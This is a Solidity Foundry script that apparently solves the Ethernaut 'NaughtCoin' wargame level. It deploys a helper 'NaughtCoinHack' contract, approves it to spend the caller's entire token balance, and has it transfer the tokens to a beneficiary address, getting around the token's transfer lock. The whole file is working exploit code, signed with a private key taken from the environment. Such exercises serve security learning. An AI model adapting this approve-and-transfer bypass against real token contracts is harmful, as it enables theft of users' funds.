// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/NaughtCoin.sol";
import "../src/NaughtCoinHack.sol";

contract NaughtCoinHackScript is Script {
  NaughtCoinHack public naughtCoinHackContract;
  NaughtCoin public naughtCoinContract = NaughtCoin(0xDBf5FA74DCCf4193C913C22A039c2Dd81C02ba35);

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    address attackerAddress = 0x359bfB5160946a55f03c080c2DC6975C8F970d5C;
    address beneficiaryAddress = 0x3dE273C351370648AE6Ed79Cfd402da10E34D66A;
    vm.startBroadcast(attacker);

    naughtCoinHackContract = new NaughtCoinHack(0xDBf5FA74DCCf4193C913C22A039c2Dd81C02ba35);

    naughtCoinContract.approve(address(naughtCoinHackContract), naughtCoinContract.balanceOf(attackerAddress));

    naughtCoinHackContract.transfer(beneficiaryAddress, naughtCoinContract.allowance(attackerAddress, address(naughtCoinHackContract)));

    console.log(naughtCoinContract.balanceOf(beneficiaryAddress));
    console.log(naughtCoinContract.balanceOf(attackerAddress));
  }
}
